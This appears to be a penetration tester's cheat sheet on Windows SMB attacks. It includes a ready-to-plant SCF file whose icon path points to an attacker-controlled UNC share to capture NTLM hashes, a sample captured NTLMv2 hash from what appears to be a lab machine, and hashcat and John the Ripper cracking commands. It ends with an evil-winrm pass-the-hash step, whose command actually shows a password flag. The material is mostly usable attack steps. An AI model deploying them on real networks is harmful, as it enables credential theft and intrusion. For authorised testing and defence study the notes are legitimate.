# Windows SMB attack

## 1. SMB Share - SCF File attack

"It is not new that SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share."

test.scf:
```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

"Saving the file as SCF file will make the it to be executed when the user will browse the file. Adding the @ symbol in front of the filename will place the pentestlab.scf on the top of the share drive."

After upload, use Metasploit or Responder to capture the ntlm hash.

Source:
- https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
- https://cqureacademy.com/blog/penetration-testing/smb-relay-attack

## 2. NTLMv2-SSP Hash cracker

Hash captured by responder look like this: user :: LMv2 | CC | NTv2 | CC*
```
[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony 
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:63b8aa12ed9060d3:78455186273D8469E2E7776F07C11B9C:010100000000000000D5F4F805BDD701D7CD83720BFA5724000000000200080054004F004600490001001E00570049004E002D00410057005600420057005A0037004B0033004A00540004003400570049004E002D00410057005600420057005A0037004B0033004A0054002E0054004F00460049002E004C004F00430041004C000300140054004F00460049002E004C004F00430041004C000500140054004F00460049002E004C004F00430041004C000700080000D5F4F805BDD701060004000200000008003000300000000000000000000000002000006BAE1ECC1BDDB39ABFF2B39BE23DEAF5761F532E82A9530F2DE6EFA553E009330A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310037003500000000000000000000000000
```

Algorithm:
```
SC = 8-byte server challenge, random
CC = 8-byte client challenge, random
CC* = (X, time, CC2, domain name)
v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)
LMv2 = HMAC-MD5(v2-Hash, SC, CC)
NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
response = LMv2 | CC | NTv2 | CC*
```

Then it can be cracked using hashcat or JTR:
```
# Crack using JTR
john --format=netntlmv2 hash.txt

# Crack using HashCat
$ hashcat -m 5600 -a 3 hash.txt # brouteforce
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt # dictionary attack
```
Source:
- https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4

## Pass-the-Hash Attack

If cracking hash does not work, it is  worth knowing that evil-winrm can use a hash to authenticate.

```
$ ruby evil-winrm.rb -i <target_ip> -u <username> -p <password>
```

Alternative ways to pass the hash:
- https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/


# Cheatsheets:
- https://www.exploit-db.com/docs/48760
- https://book.hacktricks.xyz/pentesting/pentesting-smb
- https://cqureacademy.com/blog/penetration-testing/smb-relay-attack